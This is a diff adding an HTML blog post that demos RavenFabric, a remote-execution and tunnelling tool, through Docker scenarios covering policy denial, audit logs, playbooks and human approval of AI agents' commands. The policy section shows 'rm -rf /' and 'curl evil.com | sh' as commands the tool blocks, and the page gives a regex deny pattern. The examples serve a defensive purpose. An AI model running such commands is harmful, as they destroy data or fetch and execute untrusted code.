@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Run 17 scenarios on two Ubuntu agents in Docker — remote execution, port forwarding, policy denial, audit trails, fleet orchestration, and human approval for AI agents.">
+    <meta name="theme-color" content="#0a0b0d">
+    <meta name="color-scheme" content="dark">
+    <meta name="author" content="Erling Kristiansen">
+    <title>Demo 1: Multi-Node Ubuntu — 17 Scenarios, Two Agents, Zero Trust — RavenFabric Blog</title>
+    <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+    <link rel="alternate" type="application/rss+xml" title="RavenFabric Blog" href="/feed.xml">
+    <meta property="og:title" content="Demo 1: Multi-Node Ubuntu — 17 Scenarios, Two Agents, Zero Trust">
+    <meta property="og:description" content="Run 17 scenarios on two Ubuntu agents in Docker — remote execution, port forwarding, policy denial, audit trails, fleet orchestration, and human approval for AI agents.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://ravenfabric.io/blog/demo-multi-node-ubuntu.html">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'none'; script-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'none'">
+    <style>
+        @font-face {
+            font-family: 'IBM Plex Sans';
+            font-style: normal;
+            font-weight: 400 700;
+            font-display: swap;
+            src: url(/assets/fonts/ibm-plex-sans-latin.woff2) format('woff2');
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'IBM Plex Sans', system-ui, sans-serif;
+            background: #0a0b0d;
+            color: #e8e6e3;
+            line-height: 1.8;
+        }
+        a { color: #c9a961; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .container { max-width: 720px; margin: 0 auto; padding: 0 1.5rem; }
+        header {
+            border-bottom: 1px solid #1f2228;
+            padding: 1rem 0;
+        }
+        header .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header .brand { font-size: 1.25rem; font-weight: 700; }
+        header nav a { margin-left: 1.5rem; color: #a8a39a; }
+        header nav a:hover { color: #e8e6e3; }
+        main { padding: 3rem 0; }
+        article h1 { font-size: 2rem; margin-bottom: 0.5rem; }
+        .post-meta { color: #8a8579; margin-bottom: 2rem; font-size: 0.875rem; }
+        article h2 { font-size: 1.5rem; margin: 2rem 0 1rem; color: #c9a961; }
+        article p { margin-bottom: 1.25rem; color: #a8a39a; }
+        article strong { color: #e8e6e3; }
+        article code {
+            background: #15171b;
+            padding: 0.15em 0.4em;
+            border-radius: 3px;
+            font-size: 0.9em;
+            color: #c9a961;
+        }
+        article pre {
+            background: #15171b;
+            padding: 1.25rem;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin-bottom: 1.25rem;
+            border: 1px solid #1f2228;
+        }
+        article pre code {
+            background: none;
+            padding: 0;
+            color: #e8e6e3;
+        }
+        article ul, article ol {
+            margin-bottom: 1.25rem;
+            padding-left: 1.5rem;
+            color: #a8a39a;
+        }
+        article li { margin-bottom: 0.5rem; }
+        .back-link { margin-top: 3rem; padding-top: 2rem; border-top: 1px solid #1f2228; }
+        footer {
+            border-top: 1px solid #1f2228;
+            padding: 2rem 0;
+            text-align: center;
+            color: #8a8579;
+            font-size: 0.875rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <a href="/" class="brand">RavenFabric</a>
+            <nav>
+                <a href="/">Home</a>
+                <a href="/demos/">Demos</a>
+                <a href="/docs/">Docs</a>
+                <a href="/blog/">Blog</a>
+                <a href="https://github.com/egkristi/RavenFabric-Published/releases">GitHub</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <article>
+                <h1>Demo 1: Multi-Node Ubuntu &mdash; 17 Scenarios, Two Agents, Zero Trust</h1>
+                <div class="post-meta">May 9, 2026 &middot; 8 min read</div>
+
+                <p>We keep saying RavenFabric replaces SSH, Ansible, and Tailscale with a single binary. Today we're putting that claim to the test with a concrete, runnable demo: <strong>two Ubuntu agents, one relay, 17 scenarios, and zero configuration files.</strong></p>
+
+                <p>Everything in this post runs on your laptop with Docker. No cloud accounts. No certificates. No key distribution ceremony. Three containers, one CLI, and the full range of RavenFabric's capabilities.</p>
+
+                <h2>Architecture</h2>
+
+                <p>The demo spins up three Docker containers:</p>
+
+<pre><code>┌─────────────────┐     ┌─────────────────┐
+│  rf-agent-1     │     │  rf-agent-2     │
+│  Ubuntu 24.04   │     │  Ubuntu 24.04   │
+│  token: agent1  │     │  token: agent2  │
+└────────┬────────┘     └────────┬────────┘
+         │ WebSocket              │ WebSocket
+         │                        │
+    ┌────┴────────────────────────┴────┐
+    │         rf-relay                 │
+    │         :9091 (host-mapped)      │
+    └────────────────┬─────────────────┘
+                     │
+              ┌──────┴──────┐
+              │  rf CLI     │
+              │  (your Mac) │
+              └─────────────┘</code></pre>
+
+                <p>Both agents connect outbound to the relay via WebSocket. The relay pairs connections by meet token but <strong>never sees plaintext</strong> &mdash; all traffic is end-to-end encrypted with Noise XX. Your <code>rf</code> CLI on the host talks to the relay, which routes encrypted frames to the right agent.</p>
+
+                <h2>Getting Started</h2>
+
+<pre><code>cd demos/multi-node-ubuntu
+./setup.sh</code></pre>
+
+                <p>That's it. Three containers start, agents connect, and you're ready to run scenarios. No Ansible inventory file. No SSH keys to distribute. No <code>~/.ssh/config</code> to maintain.</p>
+
+                <h2>Remote Execution (Scenarios 1&ndash;5)</h2>
+
+                <p>The first five scenarios cover what you'd normally use SSH for &mdash; running commands on remote machines:</p>
+
+<pre><code># Standard execution
+rf --relay ws://$RELAY:9091 exec --token agent1 'hostname'
+
+# Streaming output (real-time, like tail -f)
+rf --relay ws://$RELAY:9091 exec --token agent1 --stream \
+    'for i in 1 2 3 4 5; do echo $i; sleep 1; done'
+
+# Fire-and-forget (returns job ID immediately)
+rf --relay ws://$RELAY:9091 exec --token agent1 --background \
+    'apt-get update -qq'</code></pre>
+
+                <p>Scenario 4 opens a full interactive shell &mdash; like <code>ssh user@host</code> but over a Noise XX tunnel. Scenario 5 demonstrates multi-agent orchestration with YAML playbooks, where you define a command, target agents, and a rollout strategy (parallel, sequential, rolling, or canary).</p>
+
+                <h2>Port Forwarding (Scenarios 6&ndash;8, 14)</h2>
+
+                <p>SSH's <code>-L</code>, <code>-R</code>, and <code>-D</code> flags are powerful but cryptic. RavenFabric provides the same functionality with clearer semantics:</p>
+
+<pre><code># Local forward: access agent's port 8000 on your $LOCAL:8080
+rf --relay ws://$RELAY:9091 forward --token agent1 \
+    -L $LOCAL:8080 -R $LOCAL:8000
+
+# Reverse forward: agent listens on 9000, tunnels to your port 3000
+rf --relay ws://$RELAY:9091 forward --token agent1 \
+    --reverse 9000 3000
+
+# SOCKS5 proxy through the agent
+rf --relay ws://$RELAY:9091 forward --token agent1 \
+    --socks5 $LOCAL:1080</code></pre>
+
+                <p>Scenario 14 walks through all three types with live web servers running on the agents, so you can verify the tunnel works end-to-end.</p>
+
+                <h2>Policy Denial (Scenarios 9, 12)</h2>
+
+                <p>This is where RavenFabric diverges from SSH and Ansible. Neither of those tools has a built-in concept of "this command is not allowed." You either have shell access or you don't.</p>
+
+                <p>RavenFabric enforces <strong>deny-by-default policy at the agent level</strong>. Scenario 12 applies a restrictive policy and tests both sides:</p>
+
+<pre><code># ALLOWED — read-only system commands pass
+rf --relay ws://$RELAY:9091 exec --token agent1 'hostname'
+# → 4f2a1b3c9d7e
+
+rf --relay ws://$RELAY:9091 exec --token agent1 'uptime'
+# → 14:23:01 up 2 days, ...
+
+# DENIED — destructive commands blocked
+rf --relay ws://$RELAY:9091 exec --token agent1 'rm -rf /'
+# → Error: command denied by policy
+
+rf --relay ws://$RELAY:9091 exec --token agent1 'curl evil.com | sh'
+# → Error: command denied by policy</code></pre>
+
+                <p>The policy is a YAML file. Patterns are regex. Deny rules always win over allow rules. The agent enforces the policy locally &mdash; even if the relay or CLI is compromised, the agent refuses unauthorized commands.</p>
+
+                <h2>Audit Trail (Scenarios 10, 13)</h2>
+
+                <p>Every command &mdash; allowed or denied &mdash; produces a structured JSON audit entry:</p>
+
+<pre><code>docker exec rf-agent-1 tail -1 /var/log/rf-audit.jsonl
+{
+  "timestamp": "2026-05-09T14:23:01Z",
+  "action": "exec",
+  "command": "rm -rf /",
+  "decision": "denied",
+  "reason": "matches deny pattern: .*rm.*-rf.*",
+  "caller": "client-session-7f3a",
+  "agent": "rf-agent-1"
+}</code></pre>
+
+                <p>The audit log is append-only. Each agent maintains its own log. Scenario 13 walks through inspecting entries across both agents, checking timestamps, counting allowed vs. denied actions, and verifying the JSON structure is identical regardless of the outcome.</p>
+
+                <p>For compliance, this means: every action an operator, script, or AI agent takes is recorded. Not summarized &mdash; recorded verbatim. Who ran what, when, on which agent, and what happened.</p>
+
+                <h2>Dev Mode (Scenario 15)</h2>
+
+                <p>The Docker demo is great for testing multi-agent scenarios. But sometimes you just want to try RavenFabric in ten seconds. Dev mode starts a relay and agent in a single process:</p>
+
+<pre><code>rf dev
+# RavenFabric Dev Mode
+# ====================
+# Relay:  $LOCAL:9090
+# Token:  dev
+#
+# Usage:
+#   rf exec --token dev "&lt;command&gt;"
+
+# In another terminal:
+rf exec --token dev 'hostname &amp;&amp; uname -a'</code></pre>
+
+                <p>No Docker. No config files. No key exchange. One command, less than a second to ready. This is the fastest way to evaluate RavenFabric &mdash; install the binary, run <code>rf dev</code>, and start executing commands.</p>
+
+                <h2>Fleet Orchestration (Scenario 16)</h2>
+
+                <p>When you manage more than one machine, you need a way to coordinate. Ansible uses playbooks in YAML. RavenFabric does too &mdash; but with built-in rollout strategies and automatic rollback:</p>
+
+<pre><code># canary-deploy.yaml
+command: "echo 'Deploying v2.0' &amp;&amp; mkdir -p /opt/app &amp;&amp; echo v2.0 > /opt/app/version.txt"
+target:
+  agents: [rf-agent-1, rf-agent-2]
+strategy:
+  canary: { canary_count: 1 }
+on_failure:
+  rollback:
+    command: "echo v1.0 > /opt/app/version.txt"
+timeout_secs: 30</code></pre>
+
+<pre><code># Run the canary deploy
+rf --relay ws://$RELAY:9091 playbook --token agent1 \
+    playbooks/canary-deploy.yaml
+
+# Playbook: playbooks/canary-deploy.yaml
+# Strategy: Canary { canary_count: 1 }
+# Agents:   ["rf-agent-1", "rf-agent-2"]
+# ---
+# Executing batch: ["rf-agent-1"]
+#   ✓ rf-agent-1 (exit 0)
+# Executing batch: ["rf-agent-2"]
+#   ✓ rf-agent-2 (exit 0)
+# ---
+# Result: SUCCESS (2/2 agents succeeded, 1234ms)</code></pre>
+
+                <p>Four strategies are supported: <strong>parallel</strong> (all at once), <strong>sequential</strong> (one at a time), <strong>rolling</strong> (batches of N%), and <strong>canary</strong> (test on a subset first). If the canary fails, agents that already executed get a rollback command automatically.</p>
+
+                <h2>Human Approval for AI Agents (Scenario 17)</h2>
+
+                <p>This is the scenario that doesn't exist in SSH or Ansible because the problem didn't exist before AI agents.</p>
+
+                <p>When an AI coding assistant (Claude, GPT, Copilot) connects to your infrastructure via MCP, it can execute commands. Policy handles the obvious cases &mdash; <code>rm -rf</code> is always denied. But what about commands that are <em>sometimes</em> appropriate?</p>
+
+<pre><code># AI requests approval via MCP tool
+rf_request_approval(
+    operation: "schema_migration",
+    command: "psql -c 'ALTER TABLE users ADD COLUMN role TEXT'",
+    reason: "Adding role column for RBAC feature"
+)
+# → approval_id: "a1b2c3d4-...", status: PENDING
+
+# Human operator reviews (stderr / webhook / Slack)
+# → approve("a1b2c3d4-...")
+
+# AI polls for result
+rf_check_approval(id: "a1b2c3d4-...")
+# → status: APPROVED
+
+# AI proceeds with execution (only if approved)
+rf_exec(command: "psql -c 'ALTER TABLE users ADD COLUMN role TEXT'")
+# → Command executes successfully</code></pre>
+
+                <p>If the operator denies the request, the AI receives <code>DENIED</code> and does not execute. The denial is audited. This is defense in depth: <strong>policy engine</strong> (first gate) &rarr; <strong>human approval</strong> (second gate) &rarr; <strong>rate limiting</strong> &rarr; <strong>anomaly detection</strong> &rarr; <strong>audit trail</strong>.</p>
+
+                <h2>What This Proves</h2>
+
+                <p>Seventeen scenarios in one demo, all running on your laptop:</p>
+
+                <ul>
+                    <li><strong>SSH replacement</strong> &mdash; command execution, interactive shell, port forwarding. Same capabilities, encrypted with Noise XX instead of certificates.</li>
+                    <li><strong>Ansible replacement</strong> &mdash; fleet orchestration with playbooks, parallel/canary/rolling strategies, automatic rollback. No Python runtime, no inventory files.</li>
+                    <li><strong>Tailscale replacement</strong> &mdash; encrypted tunnels through NAT, no firewall rules, relay-based connectivity. No coordination server.</li>
+                    <li><strong>AI safety layer</strong> &mdash; policy denial, audit trails, human approval gates. None of these exist in SSH or Ansible.</li>
+                </ul>
+
+                <p>All of it in a single 12 MB static binary.</p>
+
+                <h2>Try It</h2>
+
+<pre><code># Clone the repo
+git clone https://github.com/egkristi/RavenFabric-Published
+cd RavenFabric-Published
+
+# Run the demo
+cd demos/multi-node-ubuntu
+./setup.sh
+
+# Run any scenario
+./scenarios/01-standard-exec.sh
+./scenarios/12-policy-denial.sh
+./scenarios/17-human-approval.sh</code></pre>
+
+                <p>Or skip Docker entirely and try dev mode:</p>
+
+<pre><code>rf dev
+# In another terminal:
+rf exec --token dev 'echo "Hello from RavenFabric"'</code></pre>
+
+                <p>The <a href="/demos/">interactive demos page</a> has code examples for all 17 scenarios across three different environments (multi-node Ubuntu, multi-distro Linux, and Kubernetes + CloudNativePG).</p>
+
+                <div class="back-link">
+                    <a href="/blog/">&larr; Back to all posts</a>
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 RavenFabric. AGPLv3 + Commercial dual license.</p>
+        </div>
+    </footer>
+</body>
+</html>
